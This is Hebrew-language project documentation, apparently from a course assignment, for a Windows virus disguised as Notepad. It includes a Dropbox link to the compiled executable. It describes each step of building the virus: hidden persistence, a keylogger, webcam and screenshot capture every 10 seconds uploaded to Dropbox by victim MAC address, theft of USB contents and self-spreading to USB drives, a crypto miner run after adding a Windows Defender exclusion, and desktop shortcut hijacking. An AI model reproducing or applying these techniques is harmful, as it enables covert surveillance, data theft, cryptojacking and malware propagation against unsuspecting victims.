תיעוד הפרוייקט:
דגשים: להוריד את ה EXE מהלינק הזה : https://www.dropbox.com/s/m31x0zcitu4r12s/notepad.exe?dl=0 (שוקל הרבה) 
להריץ רק את ה EXE . כ ADMINISTRATOR . הוירוס עובד על וינדוס 10 . יש להתקין CERTUTIL, את קיצורי הדרך שנסביר פה בתיעוד צריך גם להריץ דרך ADMINISTRATOR.
קובץ ה NOTEPAD.PYW זה רק בשביל לראות את הקוד

הסבר הפרוייקט: 
1. הוירוס נראה כמו NOTEPAD , בשביל לבלבל את הקורבן . בעת הפעלת הוירוס , נפתח NOTEPAD המקורי , ואיתו נפתח גם הוירוס.
2.הוירוס יוצר WATCHDOG , שם אותו ב TEMP . הוירוס יוצר AUTORUN , שדואג להפעיל אותו אחרי שהמחשב נכבה וכל המה שהיה צריך להיות במטלה 2. הכל בחלונות בלתי נראים.(KEYLOGGER,SERVER ...)
3. הוירוס גונב את ה MACADRESS של הקורבן ויוצר תיקייה מתאימה בשביל ניהול מספר קורבנות
4.הוירוס דואג לעשות צילום מסך וצילום מצלמה כל 10 שניות ולעלות לDROPBOX תחת התיקייה של ה MACADRESS של הקורבן 
5. הוירוס גם מעלה לתיקייה את כל התכנים הנמצאים בUSB שמחובר על המחשב , וגם מוריד ל USB את הוירוס.(כל הזמן סורק אם יש USB מחובר)
6. מוריד MINER , כורה מטבעות מה DROPBOX , ומריץ אותו . הכל לתוך הארנק שלנו.
7.הדבקת שורטקאטים . כל השורטקאטים שנמצאים על הDESKTOP יובילו לתוך קובץ PYW , שיריץ את התכנית המיועדת (שהשורטקאט אמור להוביל אליה) , ובנוסף ישחזר את הוירוס מה DROPBOX ,  ויריץ אותו ( יש לשים לב שצריך להפעיל זאת דרך ADMINISTRATOR).

תיעוד הפרוייקט:

פרסנו את הפרוייקט לחלקים , ובסוף חיברנו הכל עם מטלה 2

1.MACADRESS: 
התחלנו לעבוד על להשיג את ה MACADRESS ולנהל את זה ב DROPBOX , מצאנו פקודה שלוקחת את ה MACADRESS ושמרנו אותה, ומעכשיו כל פעם שמעלים משהו של הקורבן , מוסיפים את ה MACADRESS ל PATH . בחלק הזה לא היו בעיות.

2.תצלום מסך + תצלום WEBCAM .
חיפשנו באיזה ספריות להשתמש , הספרייה הסטנדרטית של  WEBCAM היא OPENCV2. הקוד שמצאנו גרם לכמה בעיות . המצלמה הייתה פתוחה (לעיני הקורבן) , והיינו צריכים לעשות כך שיקח תמונה אוטומטית כל 10 שניות , אז שינינו את מה שצריך והכנסנו את זה ל WHILE  TRUE LOOP שיפעל כל 10 שניות. ל תצלום מסך השתמשנו ב pyautogui , הספרייה הזאת לא עובדת בוינדוס 7 חלק מהסיבה שאנחנו משאירים את זה בוינ 10. בוינ 10 לא היו בעיות . הוספנו גם את התצלום מסך ל WHILE TRUE LOOP , גם שיקח סקרין שוט כל 10 שניות . פה נתקלנו בבעיה , התמונות מציפות את הקורבן בתיקייה הנוכחית. לכן שלא ישים לב הזזנו את זה ל תיקיית TEMP . ושינינו את השם של התמונות לאותו שם , שכל פעם יעשה OVERWRITE , ואז כשהוא מעלה אותו לDROPBOX שינינו את השם שיהיה הזמן הנוכחי וסוג. (לדוגמא TIME - SCREENSHOT.JPG) .

3.MINER : 
מיינר שנקרא T-REX , העלנו לתוך הDROPBOX ודאגנו להוריד אותו , לעשות EXTRACT לתוך הTEMP ולהפעיל. פה נתקלנו בכמה בעיות . העיקרית היא שבצורה הזאת כשמפעילים את ה T-REX , יש ACESS DENIED , מה WINDOWS DEFENDER . אז מה שהיינו צריכים לעשות זה להוסיף את התיקייה הזאת של המיינר לתוך ה EXCLUSIONS של ה DEFENDER . בשביל לעשות את זה צריך גם גישה של ADMINISTRATOR. ואחרי חיפוש ותהייה הגענו למצב שזה מוסיף לתוך ה EXCLUSIONS , דרך ה SHELL. והכל רץ

4. תיעוד גניבת קבצים(וגם הדבקת usb):
 בעזרת win32file אפשר להציג את מצב הכוננים שבשימוש. ההצגה היא בינארית שכל 1 מייצג כונן קיים , המיקום מייצג את האותיות z..cba . לכן כדי לבדוק איזה כוננים בשימוש צריך להסיט את 1 לפי מספר מ 0 עד 25.
על כל כונן כזה בודקים אם הוא removable,אם כן אז הוא אחסון שאפשר לגנוב ממנו קבצים. בעזרת פעולות פשוטות של os אפשר להעתיק ממנו קבצים ולהעביר אליו את הקוד שקיים על המחשב. בלולאה שמשמשת את צילום המצלמה והמסך הוספנו בדיקה שבודקת אם
drivebits השתנה מאז הפעם האחרונה שבדקנו את הערך שלו. אם כן היה שינוי אז או שהוסר כונן או שהכניסו כונן וככה הקוד יודע לזהות אם הכניסו usb ולבצע פעולות עליו רק בהכנסה שלו ולא לפעול עליו כל איטרציה של הלולאה.

5. קיצורי דרך exe: 
כדי להדביק את קיצורי הדרך משתמשים בספריית הos כדי לגשת לקבצים בdesktop בעזרת משנה סביבה userprofile. עוברים על הקבצים בdesktop וקוראים לwindows shell host כדי לבצע פעולות על מערכת ההפעלה, 
במקרה הזה כדי לערוך את קיצורי הדרך. מחפשים קבצים עם סיומת lnk ובודקים אם הם מקשרים לקבצי exe (קיצורי דרך אחרים היו עובדים פחות טוב ולכן לא חלק מההדבקה: תיקיות לא היו פועלות, קיצורי דרך שמופעלים על ידי exe אחרים כמו קבצי txt היו עובדים אבל 
האייקון שלהם היה משתנה בצורה מחשידה וכדי לשנות אותו לאייקון מתאים צריך לעשות הפרדה למקרים לכל סיומת והתוכנה שפותחת אותה) אחרי שמוודאים שהקיצור דרך מתאים להדבקה מכינים קובץ pyw (שאפשר להפוך אותו גם לexe אבל כל exe כזה יכול לקחת כמה דקות להכין
והרצה תהיה אותו דבר אז החלטנו להשאיר את קובץ הpy) ושולחים אותו לmydocuments בשרשור תיקייה המזכיר את הקובץ המקורי. הקובץ החדש מפעיל את הexe המקורי וגם מפעיל את הוירוס( מוגבל להפעלה בעזרת admin). אחרי כתיבת הקובץ ושליחתו הקוד מכוון את 
הshortcut הקיים לקובץ שנוצר.

6. פתיחת NOTEPAD של WINDOWS
כאשר פותחים את הוירוס הראשוני , נפתח NOTEPAD , למען הסרת חששות . בשביל לעשות זאת . היינו צריכים לפתוח NOTEPAD כשמריצים את ה וירוס. אבל היו פה הרבה בעיות :
1.הוירוס בהרצה הראשונית צריך לסגור את עצמו ולהפעיל את עצמו מ TEMP. עשינו כך שהוירוס שלנו גם כן יקרה NOTEPAD.EXE.( על ה EXE בסעיף 7). לכן אפשר לסגור אותו רק מ TASKKILL . אחרת זה פשוט לא עבד ועשה הרבה מאוד בעיות(עם SYS.EXIT) ועכשיו כשעושים TASKKILL ל NOTEPAD.EXE . נסגר כל קובץ ששמו NOTEPAD.EXE , שזה אומר כשהוירוס נסגר נסגר גם ההסוואה שלו. לכן מה שעשינו, יצרנו קובץ TXT בתיקייה מסויימת בעת ההרצה הראשונית ורק בהרצה הזאת.
בהמשך הקוד ,  מתבצעת בדיקה עם קובץ TXT זה קיים , אם הוא קיים נפתח NOTEPAD , ונמחק את קובץ ה TXT . עכשיו בהרצות הבעות NOTEPAD לא ייפתח , כי קובץ TXT לא קיים . והוא נוצר רק בעת ההפעלה הראשונה . הבדיקה של אם זאת הפעלה ראשונה היא בדיקה אם ה וירוס נמצא בTEMP.
כאן נגרמו הרבה מאוד בעיות כמו , לא מוצא את ה DIRECTORY , הרבה בעיות של PATH . לאחר כמה שעות , זה תוקן ל PATH המתאים (קובץ ה EXE משנה PATH נוחכי תיעוד נוסף בסעיף 7).

7.הכנת exe שיראה כמו notepad: 
אחרי שכל חלק עבד בנפרד איחדנו את כל הקוד  כולל מטלה 2 והרצנו אותו בצורה רגילה. נתקלנו בבעייה שהlistener תקע את הקוד. אחרי בדיקת התיעוד של הספרייה ראינו שהדרך שהשתמשנו בה עד עכשיו הייתה מחכה לסיום הפעולה של הlistener 
שינינו את הקוד כך שהוא ירוץ במקביל ולא יפריע להרצת שאר הקוד.  אחרי שבדקנו שהכל עבד השתמשנו בpyinstaller עם אופציית onefile-- כדי שיהיה רק קובץ אחד. נתקלנו בבעייה שניסינו להפוך לexe ואחרי בדיקה עם מצב debug גילינו שpyinput לא עבד.
בדיקה באינטרנט גילתה מכך שpyinstaller עובד עם גרסא יותר ישנה של pyinput ולא מצליח לעבוד עם גרסאות יותר חדשות.. התקנו במחשבים שלנו את הגרסא הישנה יותר ולא היו יותר בעיות עם import. בעייה אחרת שהייתה היא שהקובץ לא זיהה נכון את המיקום 
של עצמו בתור exe. הוספנו בדיקה לאם הקובץ הרץ כרגע הוא executable שרץ ואם כן משיג את הpath הנוכחי של הexe בצורה שונה וזה תיקן את הבעיה.


